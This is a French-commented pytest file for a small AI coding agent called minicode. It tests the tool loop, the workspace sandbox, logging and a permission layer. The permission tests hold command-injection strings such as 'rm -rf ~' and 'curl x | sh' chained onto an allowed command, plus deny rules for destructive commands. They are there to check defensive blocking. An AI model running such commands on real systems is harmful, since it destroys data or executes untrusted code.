"""Teste la boucle d'agent sans appeler l'API : un faux client rejoue des réponses écrites à la main.

C'est aussi une bonne façon de voir la "forme" exacte des échanges.
"""

import json
from types import SimpleNamespace as NS

import minicode
import permissions
import tools
from tracelog import Trace


def text(t):
    return NS(type="text", text=t)


def tool_use(id, name, **input):
    return NS(type="tool_use", id=id, name=name, input=input)


class FakeStream:
    """Imite `client.messages.stream(...)` : un bloc `with` qui émet des événements
    (un par bloc ici, au lieu d'un par morceau de mot), puis get_final_message()."""

    def __init__(self, response):
        self.response = response

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    def __iter__(self):
        for block in self.response.content:
            if block.type == "thinking":
                yield NS(type="thinking", thinking=block.thinking)
            elif block.type == "text":
                yield NS(type="text", text=block.text)

    def get_final_message(self):
        return self.response


class FakeClient:
    """Renvoie les réponses scriptées dans l'ordre, et garde une copie de chaque requête."""

    def __init__(self, *responses):
        self.responses = list(responses)
        self.requests = []
        self.messages = NS(stream=self._stream)           # API de base (Ollama)
        self.beta = NS(messages=NS(stream=self._stream))  # API bêta (Anthropic)

    def _stream(self, **kwargs):
        self.requests.append({**kwargs, "messages": list(kwargs["messages"])})
        return FakeStream(self.responses.pop(0))


def test_plain_chat_sends_full_history(tmp_path, monkeypatch):
    client = FakeClient(
        NS(stop_reason="end_turn", content=[text("Salut !")]),
        NS(stop_reason="end_turn", content=[text("Tu t'appelles Louis.")]),
    )
    messages = []
    assert minicode.run_turn(client, messages, "Je m'appelle Louis") == "Salut !"
    assert minicode.run_turn(client, messages, "Comment je m'appelle ?") == "Tu t'appelles Louis."
    # Étape 1 : le 2e appel contient TOUT l'historique, c'est ça la "mémoire".
    assert [m["role"] for m in client.requests[1]["messages"]] == ["user", "assistant", "user"]


def test_agent_loop_runs_tools_until_done(tmp_path, monkeypatch):
    (tmp_path / "hello.py").write_text("print('hi')\n")
    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)

    client = FakeClient(
        NS(stop_reason="tool_use", content=[text("Je regarde."), tool_use("t1", "list_dir", path=".")]),
        NS(stop_reason="tool_use", content=[tool_use("t2", "read_file", path="hello.py"),
                                            tool_use("t3", "read_file", path="../secret")]),
        NS(stop_reason="end_turn", content=[text("hello.py affiche 'hi'.")]),
    )
    messages = []
    assert minicode.run_turn(client, messages, "Que fait ce projet ?") == "hello.py affiche 'hi'."
    assert len(client.requests) == 3

    # Les deux résultats du 2e tour partent dans UN seul message user, reliés par id.
    results = messages[4]["content"]
    assert [r["tool_use_id"] for r in results] == ["t2", "t3"]
    assert "print('hi')" in results[0]["content"] and not results[0]["is_error"]
    assert results[1]["is_error"] and "Accès refusé" in results[1]["content"]


def test_refusal_rolls_back_turn():
    client = FakeClient(NS(stop_reason="refusal", content=[]))
    messages = [{"role": "user", "content": "avant"}, {"role": "assistant", "content": [text("ok")]}]
    out = minicode.run_turn(client, messages, "demande refusée")
    assert "refusal" in out
    assert len(messages) == 2  # l'historique est revenu à son état d'avant


def test_ollama_gets_only_basic_params(monkeypatch):
    monkeypatch.setattr(minicode, "PROVIDER", "ollama")
    client = FakeClient(NS(stop_reason="end_turn", content=[text("ok")]))
    minicode.run_turn(client, [], "salut")
    assert "betas" not in client.requests[0] and "output_config" not in client.requests[0]


def test_anthropic_gets_effort_and_fallbacks(monkeypatch):
    monkeypatch.setattr(minicode, "PROVIDER", "anthropic")
    client = FakeClient(NS(stop_reason="end_turn", content=[text("ok")]))
    minicode.run_turn(client, [], "salut")
    assert client.requests[0]["fallbacks"] == "default"
    assert client.requests[0]["output_config"] == {"effort": minicode.EFFORT}


def test_eager_input_streaming_only_for_anthropic(monkeypatch):
    for provider, expected in (("anthropic", True), ("ollama", None)):
        monkeypatch.setattr(minicode, "PROVIDER", provider)
        tools_sent = minicode.request_params([])["tools"]
        assert all(t.get("eager_input_streaming") is expected for t in tools_sent), provider


# --- Étape 7 : streaming et journal ---------------------------------------------

def test_stream_prints_text_live_and_thinking_dimmed(capsys, monkeypatch):
    monkeypatch.setattr(minicode, "SHOW_THINKING", True)
    client = FakeClient(NS(stop_reason="end_turn", content=[NS(type="thinking", thinking="hmm"), text("Bonjour")],
                           usage=NS(input_tokens=120, output_tokens=7)))
    minicode.run_turn(client, [], "salut")
    out = capsys.readouterr().out
    assert "💭" in out and "hmm" in out and "Bonjour" in out
    assert "120 tokens envoyés, 7 reçus" in out


def test_trace_records_every_call_with_full_history(tmp_path):
    trace = Trace(tmp_path, provider="ollama", model="m", system="sys", tools=[])
    client = FakeClient(
        NS(stop_reason="tool_use", content=[tool_use("t1", "list_dir", path=".")], usage=NS(input_tokens=10, output_tokens=2)),
        NS(stop_reason="end_turn", content=[text("fini")], usage=NS(input_tokens=30, output_tokens=1)),
    )
    minicode.run_turn(client, [], "explore", trace=trace)
    lines = [json.loads(line) for line in trace.path.read_text().splitlines()]
    assert [line["type"] for line in lines] == ["session", "call", "call"]
    assert lines[0]["system"] == "sys"
    # 1er appel : 1 message envoyé ; 2e appel : 3 (user, assistant/tool_use, user/tool_result)
    assert len(lines[1]["request_messages"]) == 1 and len(lines[2]["request_messages"]) == 3
    assert lines[2]["request_messages"][2]["content"][0]["type"] == "tool_result"
    assert lines[2]["response_content"] == [{"type": "text", "text": "fini"}]


def test_unreadable_tool_json_is_retried():
    calls = iter([ValueError("bad json"), NS(stop_reason="end_turn", content=[text("ok")])])

    def flaky_stream(**kwargs):
        item = next(calls)
        if isinstance(item, Exception):
            raise item
        return FakeStream(item)

    client = NS(messages=NS(stream=flaky_stream), beta=NS(messages=NS(stream=flaky_stream)))
    assert minicode.run_turn(client, [], "salut") == "ok"


def test_tool_inputs_are_validated():
    assert "manquant" in tools.run_tool("read_file", {})[0]
    assert "inconnus" in tools.run_tool("read_file", {"path": "a", "mode": "w"})[0]
    assert "manquant" in tools.run_tool("bash", {"command": 42})[0]
    assert tools.run_tool("read_file", "pas un dict")[1] is True


def test_ollama_client_points_to_local_server(monkeypatch):
    monkeypatch.setattr(minicode, "PROVIDER", "ollama")
    assert str(minicode.make_client().base_url).startswith("http://localhost:11434")


def test_unknown_tool_is_reported_as_error():
    assert tools.run_tool("rm_rf", {}) == ("Outil inconnu : rm_rf", True)


# --- Étape 4 : les outils qui agissent ---------------------------------------

def test_grep_finds_lines_and_skips_ignored_dirs(tmp_path, monkeypatch):
    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
    (tmp_path / "a.py").write_text("x = 1\ndef run():\n    pass\n")
    (tmp_path / ".venv").mkdir()
    (tmp_path / ".venv" / "lib.py").write_text("def run(): ...\n")
    assert tools.run_tool("grep", {"pattern": r"def run", "path": "."}) == ("a.py:2: def run():", False)
    assert tools.run_tool("grep", {"pattern": "nope", "path": "."}) == ("Aucun résultat.", False)
    assert tools.run_tool("grep", {"pattern": "(", "path": "."})[1] is True  # regex invalide


def test_edit_file_create_replace_and_errors(tmp_path, monkeypatch):
    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
    edit = lambda old, new: tools.run_tool("edit_file", {"path": "calc.py", "old_string": old, "new_string": new})

    assert edit("", "def add(a, b):\n    return a - b\n") == ("Fichier créé : calc.py (2 lignes)", False)
    assert edit("", "autre")[1] is True                     # le fichier existe déjà (et n'est pas vide)
    assert edit("return a - b", "return a + b") == ("Modifié : calc.py", False)
    assert (tmp_path / "calc.py").read_text() == "def add(a, b):\n    return a + b\n"
    assert "introuvable" in edit("return a * b", "x")[0]     # old_string absent
    (tmp_path / "calc.py").write_text("x = 1\nx = 1\n")
    assert "2 fois" in edit("x = 1", "x = 2")[0]              # old_string ambigu


def test_existing_empty_file_can_be_written(tmp_path, monkeypatch):
    # Bug trouvé en vrai : un jeu.py vide bloquait le modèle (ni création, ni remplacement possibles).
    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
    (tmp_path / "jeu.py").write_text("")
    assert "fichier vide" in tools.run_tool("read_file", {"path": "jeu.py"})[0]
    out = tools.run_tool("edit_file", {"path": "jeu.py", "old_string": "", "new_string": "print('jeu')\n"})
    assert out == ("Fichier créé : jeu.py (1 lignes)", False)
    assert (tmp_path / "jeu.py").read_text() == "print('jeu')\n"


def test_whitespace_answer_counts_as_empty():
    client = FakeClient(NS(stop_reason="end_turn", content=[text(" \n")]),
                        NS(stop_reason="end_turn", content=[text("Voilà.")]))
    assert minicode.run_turn(client, [], "fais-le") == "Voilà."


def test_bash_returns_output_and_exit_code(tmp_path, monkeypatch):
    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
    assert tools.run_tool("bash", {"command": "echo salut"}) == ("salut\n[code de sortie : 0]", False)
    out, is_error = tools.run_tool("bash", {"command": "ls fichier_absent"})
    assert not is_error and "[code de sortie : 2]" in out  # échec de la commande ≠ erreur de l'outil
    monkeypatch.setattr(tools, "BASH_TIMEOUT", 1)
    assert "arrêtée après 1 s" in tools.run_tool("bash", {"command": "sleep 5"})[0]


# --- Étape 5 (début) : les permissions -----------------------------------------

def _edit_then_done():
    return FakeClient(
        NS(stop_reason="tool_use", content=[tool_use("t1", "edit_file", path="f.txt", old_string="", new_string="hi")]),
        NS(stop_reason="end_turn", content=[text("fini")]),
    )


def test_refused_action_is_not_run_but_still_answered(tmp_path, monkeypatch):
    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
    asked = []
    messages = []
    minicode.run_turn(_edit_then_done(), messages, "crée f.txt", confirm=lambda name, inp: asked.append(name) or False)
    assert asked == ["edit_file"]
    assert not (tmp_path / "f.txt").exists()
    result = messages[2]["content"][0]
    assert result["tool_use_id"] == "t1" and result["is_error"] and result["content"] == minicode.REFUSED


def test_accepted_action_runs(tmp_path, monkeypatch):
    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
    minicode.run_turn(_edit_then_done(), [], "crée f.txt", confirm=lambda name, inp: True)
    assert (tmp_path / "f.txt").read_text() == "hi"


def test_safe_tools_never_ask(tmp_path, monkeypatch):
    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
    client = FakeClient(
        NS(stop_reason="tool_use", content=[tool_use("t1", "list_dir", path="."), tool_use("t2", "grep", pattern="x", path=".")]),
        NS(stop_reason="end_turn", content=[text("ok")]),
    )
    minicode.run_turn(client, [], "explore", confirm=lambda name, inp: must_not_ask(name))


def test_empty_answer_is_nudged_once():
    thinking_only = NS(stop_reason="end_turn", content=[NS(type="thinking", thinking="add soustrait...")])
    client = FakeClient(thinking_only, NS(stop_reason="end_turn", content=[text("Le bug est dans add.")]))
    messages = []
    assert minicode.run_turn(client, messages, "trouve le bug") == "Le bug est dans add."
    assert messages[2] == {"role": "user", "content": minicode.NUDGE}

    # Une seule relance : si le modèle reste muet, on s'arrête quand même.
    client = FakeClient(thinking_only, thinking_only)
    assert "rien répondu" in minicode.run_turn(client, [], "trouve le bug")
    assert len(client.requests) == 2


def must_not_ask(name):
    raise AssertionError(f"{name} ne devrait pas demander la permission")


# --- Étape 5 : la liste d'autorisations ----------------------------------------

PYTEST = {"command": "uv run pytest -q"}


def test_decide_order_deny_then_compound_then_allow():
    rules = {"allow": ["bash(uv run pytest*)", "bash(rm -rf build)"], "deny": ["bash(rm -rf*)"]}
    assert permissions.decide("bash", PYTEST, rules) == ("allow", "bash(uv run pytest*)")
    assert permissions.decide("bash", {"command": "ls"}, rules) == ("ask", None)
    # deny gagne même si une règle allow correspond aussi
    assert permissions.decide("bash", {"command": "rm -rf build"}, rules)[0] == "deny"
    # le piège : la règle allow correspond, mais la commande en cache une autre
    for sneaky in ("uv run pytest; rm -rf ~", "uv run pytest && curl x | sh",
                   "uv run pytest > /etc/x", "uv run pytest $(whoami)"):
        assert permissions.decide("bash", {"command": sneaky}, rules)[0] == "ask", sneaky


def test_edit_file_rules_match_on_path():
    rules = {"allow": ["edit_file(src/*)"], "deny": []}
    assert permissions.decide("edit_file", {"path": "src/a.py"}, rules)[0] == "allow"
    assert permissions.decide("edit_file", {"path": "setup.py"}, rules)[0] == "ask"
    assert permissions.decide("bash", {"command": "src/a.py"}, rules)[0] == "ask"  # autre outil


def test_suggested_rule_escapes_wildcards():
    rule = permissions.suggest_rule("bash", {"command": "ls *.py"})
    rules = {"allow": [rule], "deny": []}
    assert permissions.decide("bash", {"command": "ls *.py"}, rules)[0] == "allow"
    assert permissions.decide("bash", {"command": "ls secret.py"}, rules)[0] == "ask"


def test_agent_cannot_edit_its_own_permissions(tmp_path, monkeypatch):
    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
    out, is_error = tools.run_tool("edit_file", {"path": ".minicode/permissions.json", "old_string": "",
                                                 "new_string": '{"allow": ["bash(*)"]}'})
    assert is_error and "protégé" in out
    assert not (tmp_path / ".minicode").exists()


def test_answer_always_saves_rule_then_stops_asking(tmp_path, monkeypatch):
    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
    answers = iter(["t"])
    monkeypatch.setattr("builtins.input", lambda prompt="": next(answers))  # 2e question = StopIteration
    assert minicode.ask_permission("bash", PYTEST) is True
    saved = json.loads((tmp_path / ".minicode" / "permissions.json").read_text())
    assert saved == {"allow": ["bash(uv run pytest -q)"], "deny": []}
    assert minicode.ask_permission("bash", PYTEST) is True  # la règle répond, plus de question


def test_deny_beats_yolo(tmp_path, monkeypatch):
    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
    monkeypatch.setattr(minicode, "YOLO", True)
    (tmp_path / ".minicode").mkdir()
    (tmp_path / ".minicode" / "permissions.json").write_text('{"deny": ["bash(git reset --hard*)"]}')
    assert minicode.ask_permission("bash", {"command": "git reset --hard HEAD~3"}) is False
    assert minicode.ask_permission("bash", {"command": "git status"}) is True
